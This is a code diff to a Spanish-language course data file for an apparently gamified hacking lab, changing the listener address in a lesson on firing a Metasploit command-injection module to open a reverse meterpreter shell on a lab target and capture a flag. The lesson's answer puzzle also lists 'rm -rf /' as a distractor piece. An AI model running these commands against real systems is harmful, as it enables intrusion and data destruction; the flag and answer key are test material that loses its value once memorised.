@@ -83,7 +83,7 @@ const EXPLOIT_MSF: Curso = {
       body:
         "Ahora sí: cargá el módulo, apuntá RHOSTS a la víctima, poné tu LHOST/LPORT y dispará. Si el objetivo es vulnerable, se abre una sesión meterpreter y cae la bandera del sistema.",
       command:
-        'msfconsole -x "use exploit/nande/http/cmd_injection; set RHOSTS 10.10.5.50; set LHOST 10.10.0.5; set LPORT 4444; exploit"',
+        'msfconsole -x "use exploit/nande/http/cmd_injection; set RHOSTS 10.10.5.50; set LHOST 10.10.0.10; set LPORT 4444; exploit"',
       explain:
         "El handler inverso escucha, el exploit inyecta el comando y la víctima se conecta de vuelta: 'Sesión meterpreter 1 abierta'. Capturás la bandera NANDE{owasp_top10_labs} y el laboratorio queda resuelto (+XP). Eso es tomar un sistema: de una web vulnerable a una shell adentro. Interactuás con sessions -i 1 (sysinfo, getuid, cat flag).",
       diagram: "exploit",
@@ -108,7 +108,7 @@ const EXPLOIT_MSF: Curso = {
       pieces: [
         "use exploit/nande/http/cmd_injection",
         "set RHOSTS 10.10.5.50",
-        "set LHOST 10.10.0.5",
+        "set LHOST 10.10.0.10",
         "set LPORT 4444",
         "exploit",
         "rm -rf /",
@@ -117,7 +117,7 @@ const EXPLOIT_MSF: Curso = {
       answer: [
         "use exploit/nande/http/cmd_injection",
         "set RHOSTS 10.10.5.50",
-        "set LHOST 10.10.0.5",
+        "set LHOST 10.10.0.10",
         "set LPORT 4444",
         "exploit",
       ],
